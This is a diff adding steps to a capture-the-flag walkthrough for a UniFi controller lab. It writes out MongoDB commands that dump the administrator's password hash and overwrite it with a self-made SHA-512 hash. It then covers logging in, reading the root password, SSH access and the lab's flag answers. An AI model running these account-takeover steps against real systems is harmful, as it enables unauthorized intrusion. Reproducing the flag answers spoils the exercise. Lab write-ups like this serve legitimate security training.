@@ -146,9 +146,92 @@ now let's upgrade it into a bash shell
 
 *Hint: Search for "update items in mongo" in Google*
 
-**Answer:db.admin.update**
+**Answer:db.admin.update()**
 
+## What is the password for the root user?
+
+1. Now we have access to mongodb let's enumerate all the users in the unify's ace database to see if there an interesting user. the forEach here beautifies the output to a readable json.
+```bash
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+```
+
+OR 
+
+```bash
+use ace
+db.admin.find().forEach(printjson);
+```
+![Screenshot 2024-03-15 at 11 39 29 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/a03cd21f-9382-4171-928d-aac68efca37e)
+
+2. We have found a hash in the key `x_shadow` which represents the password `$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.` 
+3. From the hash the value $6$ gives away that sha-512 There is no quick way or tools to crack this hash. So we can attempt to create our own and update the administrator's password.
+4. Let's create our own hash
+   ```bash
+   mkpasswd -m sha-512 Password1234
+   ```
+$6$DxHn0.Rx4LOznIAe$7YW85uGrCz.DvLORVa0jSDsn6ecADE3sVSH.i0lNpg19y30b83NfOSlpaii2cpbQWkwmxgP31OeZEnS2l5nvI0
+
+![Screenshot 2024-03-15 at 11 46 33 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/774e784d-a548-4bbd-8980-a499a28042f0)
+
+5. Now let's update the administrator's password
+
+```bash
+use ace
+db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$DxHn0.Rx4LOznIAe$7YW85uGrCz.DvLORVa0jSDsn6ecADE3sVSH.i0lNpg19y30b83NfOSlpaii2cpbQWkwmxgP31OeZEnS2l5nvI0"}})
+```
+OR 
+
+```bash
+mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$DxHn0.Rx4LOznIAe$7YW85uGrCz.DvLORVa0jSDsn6ecADE3sVSH.i0lNpg19y30b83NfOSlpaii2cpbQWkwmxgP31OeZEnS2l5nvI0"}})'
+```
+![Screenshot 2024-03-16 at 12 01 11 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/a01a30d1-329d-4c8c-8c94-9ce78ba53f0c)
+
+
+6. Now let's go to the unifi website again and try the user `administrator` and the modified password `Password1234`
+
+![Screenshot 2024-03-16 at 12 03 26 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/76b63376-a2a6-4ef1-85ec-8f439c887383)
+
+7. We now have logged in.
+![Screenshot 2024-03-16 at 12 04 40 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/9dcc2a6f-b36c-4e45-8084-196bd393f5ea)
+
+8. Navigate to settings to see if there is something interesting, in which we find out that SSH authentication can be enabled and `root` passowrd is viewable.
    
+![Screenshot 2024-03-16 at 12 07 10 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/9f7f76d1-f70e-49e1-9ed2-9adf35a5ad5c)
+
+
+**Answer: NotACrackablePassword4U2022**
+
+## Submit user flag
+
+1. Now let's try to connect via ssh. Open a new terminal and execute the following. (Use the password found in the settings)
+
+```bash
+ssh root@{target_ip_address}
+```
+
+2. We have succesfully connected and now have a shell with root privileges.
+![Screenshot 2024-03-16 at 12 10 16 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/b04c7efe-b47d-488e-9dbe-038fa8ccc430)
+
+3. Let's look for `user.txt` file
+```bash
+find -type f -name "user.txt"
+```
+![Screenshot 2024-03-16 at 12 17 23 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/87ac9c65-a171-4e14-9538-57c8c290e1e7)
+
+**Answer: 6ced1a6a89e666c0620cdb10262ba127**
+
+
+## Submit root flag
+1. Let's look for `root.txt` file
+```bash
+find -type f -name "root.txt"
+```
+
+![Screenshot 2024-03-16 at 12 19 48 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/e012ab61-90a1-41ca-82ea-c125e381fe6d)
+
+**Answer: e50bc93c75b634e4b272d2f771c33681 **
+   
+
 
 
 
